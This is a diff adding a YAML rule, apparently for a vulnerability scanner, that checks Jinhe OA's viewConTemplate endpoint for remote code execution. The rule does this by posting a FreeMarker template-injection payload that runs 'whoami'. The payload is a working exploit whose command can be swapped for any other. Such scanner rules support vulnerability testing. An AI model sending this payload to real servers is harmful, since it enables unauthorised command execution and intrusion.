@@ -1,0 +1,17 @@
+name: 金和OA-viewConTemplate-RCE
+description: >-
+  代码执行，执行whoami
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      moduId=1&code=<clob>${"freemarker.template.utility.Execute"?new()("whoami")}</clob>&uuid=1
+    expression:
+      status: 200
+      body_all:
+        - "<clob>"
+        - "</clob>"
